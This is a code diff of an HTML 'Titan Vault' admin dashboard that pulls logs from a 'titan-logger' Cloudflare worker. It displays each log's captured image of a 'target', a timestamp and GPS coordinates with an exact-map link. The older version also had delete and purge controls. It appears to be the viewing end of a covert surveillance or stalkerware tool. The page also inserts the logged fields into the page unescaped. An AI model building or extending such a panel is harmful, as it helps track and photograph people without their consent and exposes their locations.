@@ -1,49 +1,35 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titan Vault</title>
+    <title>Titan Vault | Admin</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .card { background: #222; border-radius: 15px; overflow: hidden; position: relative; border: 1px solid #333; }
-        .img-box { width: 100%; height: 300px; background: #000; display: flex; align-items: center; justify-content: center; }
-        .target-img { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .info { padding: 15px; }
-        .map-btn { display: block; background: #fc8019; color: #fff; text-decoration: none; text-align: center; padding: 10px; border-radius: 8px; font-weight: bold; margin-top: 10px; }
-        .del-btn { position: absolute; top: 10px; right: 10px; background: red; color: white; border: none; border-radius: 50%; width: 25px; height: 25px; cursor: pointer; }
+        body { background: #0d0d0d; color: #00ff88; font-family: monospace; padding: 20px; }
+        .log-entry { border: 1px solid #333; margin-bottom: 20px; padding: 15px; border-radius: 8px; background: #1a1a1a; }
+        img { max-width: 100%; border: 1px solid #00ff88; margin-top: 10px; border-radius: 4px; }
+        .meta { color: #888; font-size: 0.9rem; }
     </style>
 </head>
 <body>
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-        <h1 style="color:#fc8019;">👔 TITAN VAULT</h1>
-        <button onclick="purge()" style="background:red; color:white; border:none; padding:10px 20px; border-radius:8px; cursor:pointer;">PURGE ALL</button>
-    </div>
-    <div id="grid" class="grid"></div>
+    <h1>TITAN CLOUD VAULT</h1>
+    <div id="data-container">Loading secure logs...</div>
 
     <script>
-        const API_URL = "https://titan-logger.saliljha523.workers.dev";
-        async function load() {
-            const res = await fetch(API_URL);
-            const data = await res.json();
-            document.getElementById('grid').innerHTML = data.map(log => `
-                <div class="card">
-                    <button class="del-btn" onclick="del(${log.id})">×</button>
-                    <div class="img-box">
-                        <img src="${log.image}" class="target-img">
-                    </div>
-                    <div class="info">
-                        <small>${log.timestamp}</small>
-                        <p style="font-size:12px; color:#aaa;">GPS: ${log.location}</p>
-                        <a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="map-btn">📍 OPEN EXACT MAP</a>
-                    </div>
+        // Use your worker URL but add a custom 'GET' handler
+        const API = "https://titan-logger.saliljha523.workers.dev";
+
+        async function loadLogs() {
+            const res = await fetch(API);
+            const logs = await res.json();
+            const container = document.getElementById('data-container');
+            container.innerHTML = logs.map(log => `
+                <div class="log-entry">
+                    <div class="meta">ID: ${log.id} | ${log.timestamp}</div>
+                    <div class="meta">LOC: ${log.location}</div>
+                    <img src="${log.image}">
                 </div>
             `).join('');
         }
-        async function del(id) { if(confirm("Delete?")) { await fetch(`${API_URL}?id=${id}`, {method:'DELETE'}); load(); } }
-        async function purge() { if(confirm("Wipe all?")) { await fetch(API_URL, {method:'DELETE'}); load(); } }
-        load();
+        loadLogs();
     </script>
 </body>
 </html>
